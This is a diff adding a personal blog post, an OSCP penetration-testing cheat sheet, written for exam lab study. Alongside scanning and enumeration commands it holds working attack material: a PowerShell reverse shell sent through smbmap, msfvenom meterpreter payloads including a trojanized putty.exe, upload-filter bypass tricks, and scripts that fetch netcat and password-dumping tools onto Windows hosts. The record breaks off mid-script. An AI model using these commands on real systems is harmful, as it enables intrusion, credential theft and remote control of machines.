@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>John Tuyen | My OSCP Cheatsheet</title>
+<meta
+  property="og:title"
+  content="John Tuyen | My OSCP Cheatsheet"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/personal-oscpcheatsheet/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="My OSCP Cheatsheet" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gallery/ ">Gallery</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">25</span>
+        <span class="rest">May 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">My OSCP Cheatsheet </h1>
+    </div>
+  </div>
+    
+  <article><p>Here is my OSCP cheatsheet that I've made for myself throughout the nightly lab sessions. I know there are plenty of cheatsheets out there and I don't think mine is even that great. Although, I still use this cheatsheet regularly and add commands that I frequently used. I hope this will help those who are looking for quick commands or insights on approaching the OSCP lab machines.</p>
+<h2 id="holy-grail-of-guides">Holy Grail of Guides</h2>
+<p><a href="https://sushant747.gitbooks.io/total-oscp-guide/">https://sushant747.gitbooks.io/total-oscp-guide/</a></p>
+<p><a href="https://github.com/wwong99/pentest-notes/blob/master/oscp/OSCP-Survival-Guide.md">https://github.com/wwong99/pentest-notes/blob/master/oscp_:/OSCP-Survival-Guide.md</a></p>
+<p><a href="https://guide.offsecnewbie.com/general-methodology">https://guide.offsecnewbie.com/general-methodology</a></p>
+<p><a href="https://github.com/Snifer/security-cheatsheets">https://github.com/Snifer/security-cheatsheets</a> - Cheatsheet for security tools</p>
+<p><a href="https://github.com/xapax/oscp/blob/master/templates">https://github.com/xapax/oscp/blob/master/templates</a> - Windows/Linux templates</p>
+<p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> - Windows PrivEsc</p>
+<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> - Linux PrivEsc</p>
+<p><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a> - Linux PrivEsc</p>
+<p><a href="http://netsec.ws/?p=180">http://netsec.ws/?p=180</a> - Windows buffer overflow</p>
+<p><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a> - Windows buffer overflow</p>
+<p><a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood</a> - Windows buffer overflow guide - MUST READ!</p>
+<hr />
+<h2 id="holy-grail-of-tools-and-lists">Holy Grail of Tools and Lists</h2>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> - Windows Pre-compiled Kernel Exploits</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20:/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20:/Windows%20-%20Privilege%20Escalation.md</a> - Windows PrivEsc</p>
+<p><a href="https://github.com/M4ximuss/Powerless">https://github.com/M4ximuss/Powerless</a> - Windows PrivEsc</p>
+<p><a href="https://github.com/0x00-0x00/ShellPop">https://github.com/0x00-0x00/ShellPop</a> - Generate easy and sophisticated reverse or bind shell commands to help you during penetration tests</p>
+<p><a href="https://github.com/gchq/CyberChef">https://github.com/gchq/CyberChef</a> - A web app for encryption, encoding, compression and data analysis </p>
+<p><a href="https://github.com/Tib3rius/AutoRecon">https://github.com/Tib3rius/AutoRecon</a> - Must have enumeration tool for OSCP</p>
+<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a> - Windows Exploit Suggester</p>
+<p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a> - List of big guns that you don't need for OSCP but worth checking out.</p>
+<p><a href="https://gtfobins.github.io/?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid">https://gtfobins.github.io/?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid</a> - Collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+<hr />
+<h2 id="exploit-chain">Exploit Chain</h2>
+<p>:question: How to find out if I have initial read/write access to the system:</p>
+<ul>
+<li>Port scan</li>
+<li>Connect to the ports via associated tools and see what I can read and/or upload or put stuff</li>
+<li>Ports that take credentials: try to brute force or try common sets of credentials</li>
+</ul>
+<p>:question: When do I have to bypass authentication in a web app?</p>
+<ul>
+<li>If I can't get initial read/write access to the file system</li>
+</ul>
+<p>:question: If you have read access to the file system like an LFI or directory tranversal, what do you need to make it a shell?</p>
+<ul>
+<li>You need write access to the file system or database somewhere else and ability to execute using LFI or directory traversal</li>
+</ul>
+<p>:question: How do you bypass authentication in a web app?</p>
+<ul>
+<li>Guess the password</li>
+<li>Bypass the password by authentication bypass</li>
+<li>Exploit the system to generate a new user</li>
+<li>If you want higher authentication to do what you need, you look for a privilege escalation</li>
+<li>Find credentials in notes that are accessible or in the manual</li>
+</ul>
+<p>:question: How do you get write access to the file system or database from read-only web app access?</p>
+<ul>
+<li>Scour through the app until you find an LFI or RFI exploit</li>
+<li>Scour through the app until you find a place to upload a file</li>
+<li>Scour through the app tickets, notes, posts to see if you can find clues or credentials</li>
+</ul>
+<p>:question: How do out find out if you have read access to the file system or database through unauthenticated access to a web app?</p>
+<ul>
+<li>Use <code>nikto</code> or <code>dirb</code> and go through the pages to see what you can find</li>
+<li>Look for directory traversal exploits</li>
+<li>Look for LFI/RFI exploits</li>
+<li>Look for data leakage exploits</li>
+<li>Look for credentials in files that are found by <code>nikto</code> or <code>dirb</code></li>
+<li>Look at the source code in pages that were found in <code>nikto</code> or <code>dirb</code></li>
+</ul>
+<hr />
+<h2 id="dns-enumeration">DNS Enumeration</h2>
+<p>Zone transfer vulnerability:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>dnsrecon -d zonetransfer.me -t axfr
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>host -t ns zonetransfer.me
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>host -l zonetransfer.me &lt;nameserver&gt;
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>host -t mx zonetransfer.me
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>host zonetransfer.me
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>dnsenum zonetransfer.me
+</span></code></pre>
+<hr />
+<h2 id="website-enumeration">Website Enumeration</h2>
+<p>Nikto HTTP(s) scanning:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nikto -h 10.11.1.115:443
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>dirb http://10.11.1.115
+</span></code></pre>
+<p>Burp Suite PUT request to create file:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>PUT /scripts/helloworld.php HTTP/1.1
+</span><span>Host: 10.11.1.13
+</span><span>User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+</span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span>Accept-Language: en-US,en;q=0.5
+</span><span>Accept-Encoding: gzip, deflate
+</span><span>Connection: close
+</span><span>Upgrade-Insecure-Requests: 1
+</span><span>Content-Length: 25
+</span><span>
+</span><span>&lt;?php echo(&quot;Success&quot;); ?&gt;
+</span></code></pre>
+<p>ASP IIS enumeration hacking: </p>
+<p><a href="https://github.com/maestron/hacking-tutorials/blob/master/Guide%20to%20IIS%20Exploitation.txt">https://github.com/maestron/hacking-tutorials/blob/master/Guide%20to%20IIS%20Exploitation.txt</a></p>
+<hr />
+<h2 id="nmap-commands">Nmap Commands</h2>
+<p><a href="https://highon.coffee/blog/nmap-cheat-sheet/">https://highon.coffee/blog/nmap-cheat-sheet/</a></p>
+<p>Nmap TCP - Quick</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>if [ $# -ne 2 ]; then
+</span><span>    echo &quot;Usage: nmap-tcp-quick.sh &lt;TARGET&gt; &lt;OUTPUT-FILENAME&gt;&quot;
+</span><span>        exit 1
+</span><span>	fi
+</span><span>	
+</span><span>	nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA $2 $1
+</span></code></pre>
+<p>Nmap TCP - Full</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>if [ &quot;$#&quot; -ne 3 ]; then
+</span><span>	echo &quot;Usage: nmap-tcp-full.sh &lt;TCP-QUICK-RESULTS.XML&gt; &lt;TARGET&gt; &lt;OUTPUT-FILENAME&gt;&quot;
+</span><span>		exit 1
+</span><span>		fi
+</span><span>		
+</span><span>		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\&quot;tcp\&quot; | cut -d&#39;&quot;&#39; -f4 | paste -sd &quot;,&quot; -) --version-intensity 9 -A
+</span><span>		-oA $3 $2
+</span></code></pre>
+<p>nmap UDP - Quick</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>if [ $# -ne 2 ]; then
+</span><span>    echo &quot;Usage: nmap-udp-quick.sh &lt;TARGET&gt; &lt;OUTPUT-FILENAME&gt;&quot;
+</span><span>        exit 1
+</span><span>	fi
+</span><span>	
+</span><span>	nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA $2 $1
+</span></code></pre>
+<p>nmap UDP - Full</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>if [ &quot;$#&quot; -ne 3 ]; then
+</span><span>	echo &quot;Usage: nmap-udp-full.sh &lt;UDP-QUICK-RESULTS.XML&gt; &lt;TARGET&gt; &lt;OUTPUT-FILENAME&gt;&quot;
+</span><span>		exit 1
+</span><span>		fi
+</span><span>		
+</span><span>		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\&quot;udp\&quot; | cut -d&#39;&quot;&#39; -f4 | paste -sd &quot;,&quot; -) --version-intensity 9 -A -oA $3 $2
+</span></code></pre>
+<p>nmap HTTP-put command to check for PUT request:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 80 --script=http-put --script-args http-put.url=&#39;/mrtg/scripts.php&#39;,http-put.file=&#39;./rs.php&#39; 10.11.1.22
+</span></code></pre>
+<hr />
+<h2 id="smb-commands">SMB Commands</h2>
+<p>SMB null session enumeration:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>enum4linux -a 10.11.1.115
+</span></code></pre>
+<p>NetBIOS enumeration:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 -oG netbios-smb.log 10.11.1.115
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nbtscan -r 10.11.1.0/24
+</span></code></pre>
+<p>Nmap SMB NSE scripts: /usr/share/nmap/scripts</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.115
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.115
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 --script=smb-vuln* 10.11.1.5
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 --script=smb* 10.11.1.115
+</span></code></pre>
+<hr />
+<h3 id="smbclient-commands">SMBClient commands</h3>
+<p>List all SMB share folders:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>smbclient -L 10.11.1.136 -N
+</span></code></pre>
+<p>Read shared folder:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>smbclient //10.11.1.136/Bob\ Share -N
+</span></code></pre>
+<p>If you wanted to download a copy of files/folders without prompt and in recursive mode:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>smb:&gt; recurse
+</span><span>smb:&gt; prompt
+</span><span>smb:&gt; mget *
+</span></code></pre>
+<hr />
+<h3 id="smbmap-commands">SMBMap Commands</h3>
+<p>https://github.com/ShawnDEvans/smbmap</p>
+<p>Show shares (or null sessions) on the host:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>smbmap -H 10.11.1.223
+</span></code></pre>
+<p>Show shares using credentials on the host:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>smbmap -H 10.11.1.223 -d thinc.local -u username -p password
+</span></code></pre>
+<p>Command execution using <code>smbmap</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ python smbmap.py -u ariley -p &#39;P@$$w0rd1234!&#39; -d ABC -x &#39;net group &quot;Domain Admins&quot; /domain&#39; -H 192.168.2.50
+</span></code></pre>
+<p>Nifty <code>smbmap</code> reverse shell (make sure you change the IP address):</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>python smbmap.py -u jsmith -p &#39;R33nisP!nckle&#39; -d ABC -H 192.168.2.50 -x &#39;powershell -command &quot;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&quot;&quot;&quot;&quot;192.168.0.153&quot;&quot;&quot;&quot;; $port=&quot;&quot;&quot;&quot;4445&quot;&quot;&quot;&quot;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&quot;&quot;&quot;&quot;cmd.exe&quot;&quot;&quot;&quot;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&quot;&#39;
+</span></code></pre>
+<hr />
+<h2 id="snmp-commands">SNMP Commands</h2>
+<p>Scan for open SNMP ports:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -sU --open -p 161 10.11.1.1-254 -oG snmplog.txt
+</span></code></pre>
+<p>Using <code>onesixtyone</code> tool:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>echo public &gt; community
+</span><span>echo private &gt;&gt; community
+</span><span>echo manager &gt;&gt; community
+</span><span>for ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; iplist
+</span><span>onesixtyone -c community -i iplist
+</span></code></pre>
+<p>Using <code>snmpwalk</code> tool to enumerate entire MIB tree: </p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmpwalk -c public -v1 10.11.1.219
+</span></code></pre>
+<p>Enumerating Windows users:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
+</span></code></pre>
+<p>Enumerating Windows processes:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
+</span></code></pre>
+<p>Enumerating Open TCP Ports:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
+</span></code></pre>
+<p>Enumerating installed software:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
+</span></code></pre>
+<p>Using <code>snmp-check</code> tool to see what is running on the system, network information, user information and etc: </p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>snmp-check -v1 -c public 10.1.1.13
+</span></code></pre>
+<hr />
+<h2 id="rpc-bind-enumeration-port-135">RPC Bind Enumeration (Port 135)</h2>
+<p>List all RPC shares:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>rpcinfo -p 10.11.1.209
+</span></code></pre>
+<p>RPC Nmap script:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 111,845 --script=rpcinfo 10.11.1.8
+</span></code></pre>
+<hr />
+<h2 id="nfs-enumeration">NFS Enumeration</h2>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sudo mount -t nfs 10.10.10.180:/ ./nfs/ -nolock
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sudo showmount -e 10.10.10.180
+</span></code></pre>
+<h2 id="vulnerability-scanning">Vulnerability Scanning</h2>
+<p>Nmap scanning: /usr/share/nmap/scripts</p>
+<p>Nmap port 80 scanning:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210
+</span></code></pre>
+<p>Nmap port 21 scanning:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
+</span></code></pre>
+<p>Nmap SMB scanning:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -v -p 139,445 --script=smb-security-mode 10.11.1.236
+</span></code></pre>
+<hr />
+<h2 id="msfvenom-commands">MSFVenom Commands</h2>
+<p>List all payloads:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -l payloads
+</span></code></pre>
+<p>Show all options for selected payload:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p java/jsp_shell_reverse_tcp --list-options
+</span></code></pre>
+<p>Creating Windows bind shells:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/shell_bind_tcp -f exe -o &lt;Filename.exe&gt; LPORT=&lt;BindPort&gt;
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/shell_bind_tcp -f dll -o &lt;Filename.dll&gt; LPORT=&lt;BindPort&gt;
+</span></code></pre>
+<p>Encoding a payload example:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
+</span></code></pre>
+<p>Remove bad characters example:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b &quot;\x00&quot; -f exe -o payload.exe
+</span></code></pre>
+<p>Example Creating executable payload using putty.exe as template:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -f exe &gt; evilputty.exe
+</span></code></pre>
+<p>Output format options (-f):</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
+</span></code></pre>
+<p>Transform format options:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+</span></code></pre>
+<hr />
+<h2 id="msfconsole-commands">MSFConsole Commands</h2>
+<p><a href="https://spreadsecurity.github.io/2016/11/17/attack-simulation-from-no-access-to-domain-admin.html">https://spreadsecurity.github.io/2016/11/17/attack-simulation-from-no-access-to-domain-admin.html</a></p>
+<p>Using <code>multi/handler</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>1. use multi/handler
+</span><span>2. set payload windows/meterpreter/reverse_tcp
+</span><span>3. set LHOST &lt;Listening_IP&gt; (for example set LHOST 192.168.5.55)
+</span><span>4. set LPORT &lt;Listening_Port&gt; (for example set LPORT 4444)
+</span><span>5. exploit
+</span></code></pre>
+<p>If the meterpreter session dies shortly after establishing the connection, try stablizing the connection by migrating to another process:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>set AUTORUNSCRIPT post/windows/manage/migrate
+</span></code></pre>
+<p>Or use another type of process thread:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>set exitfunc seh
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>set exitfunc thread
+</span></code></pre>
+<hr />
+<h2 id="searchsploit-commands">Searchsploit Commands</h2>
+<p>Look for exploits using findings from Nmap scans:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>searchsploit -x --nmap full_tcp_nmap.xml
+</span></code></pre>
+<hr />
+<h2 id="tips-and-tricks-for-file-transferring">Tips and Tricks for File Transferring</h2>
+<p>Can't upload reverse shell due to file restrictions:</p>
+<ul>
+<li>Content-Type —&gt; Change the parameter in the request header using Burp, ZAP etc.</li>
+<li>Put server executable extensions like <code>file.php5, file.shtml, file.asa, file.cert</code></li>
+<li>Changing letters to capital form <code>file.aSp</code> or <code>file.PHp3</code></li>
+<li>Using trailing spaces and/or dots at the end of the filename like <code>file.asp… … . . .. .. , file.asp , file.asp.</code></li>
+<li>Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)</li>
+<li>Upload a file with 2 extensions <code>file.php.jpg</code></li>
+<li>Use of null character —&gt; file.asp%00.jpg</li>
+<li>Create a file with a forbidden extension —&gt; <code>file.asp:.jpg or file.asp::$data</code></li>
+<li>Combination of the above</li>
+</ul>
+<hr />
+<h2 id="linux-file-transferring">Linux File Transferring</h2>
+<p>Quickly setup a ftp server:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>python -m pyftpdlib --directory ./ --port=21 --write
+</span></code></pre>
+<p>Quickly setup a web server:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>python -m SimpleHTTPServer 80
+</span></code></pre>
+<hr />
+<h2 id="windows-file-transferring">Windows File Transferring</h2>
+<p>Compressing directory or files using Powershell</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$source = &quot;C:\folder&quot;
+</span><span>$dest = &quot;C:\compressed.zip&quot;
+</span><span>Add-Type -assembly &quot;system.io.compression.filesystem&quot;
+</span><span>[io.compression.zipfile]::CreateFromDirectory($source,$dest)
+</span></code></pre>
+<p>Using Impacket, start SMB server by running <code>smbserver.py</code></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>python3 smbserver.py myshare /tmp/smbshare/ -smb2
+</span></code></pre>
+<p>This will share /tmp/smbshare directory over SMB as <code>myshare</code>. You can also use Windows to mount the share as well.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>net use Z: \\&lt;IP&gt;\myshare
+</span></code></pre>
+<p>Copy file to the /tftp and grab it from Windows machine:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>atftpd --daemon --port 69 /tftp
+</span></code></pre>
+<p>Run on Windows machine:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>tftp -i 10.11.0.219 get nc.exe
+</span></code></pre>
+<p>Download files over FTP non-interactively:</p>
+<pre data-lang="bat" style="background-color:#2b303b;color:#c0c5ce;" class="language-bat "><code class="language-bat" data-lang="bat"><span style="color:#b48ead;">echo</span><span> open </span><span style="color:#d08770;">10</span><span>.</span><span style="color:#d08770;">11</span><span>.</span><span style="color:#d08770;">0</span><span>.</span><span style="color:#d08770;">219 21</span><span>&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> USER offsec&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> ftp&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bin &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET nc.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bye &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span>
+</span><span style="color:#b48ead;">ftp</span><span> -v -n -s:</span><span style="color:#b48ead;">ftp</span><span>.txt
+</span></code></pre>
+<pre data-lang="bat" style="background-color:#2b303b;color:#c0c5ce;" class="language-bat "><code class="language-bat" data-lang="bat"><span style="color:#b48ead;">echo</span><span> open </span><span style="color:#d08770;">10</span><span>.</span><span style="color:#d08770;">11</span><span>.</span><span style="color:#d08770;">0</span><span>.</span><span style="color:#d08770;">219 21</span><span>&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> USER anonymous&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> ftp&gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bin &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET fgdump.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET cachedump.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET PwDump.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> GET servpw.exe &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span style="color:#b48ead;">echo</span><span> bye &gt;&gt; </span><span style="color:#b48ead;">ftp</span><span>.txt
+</span><span>
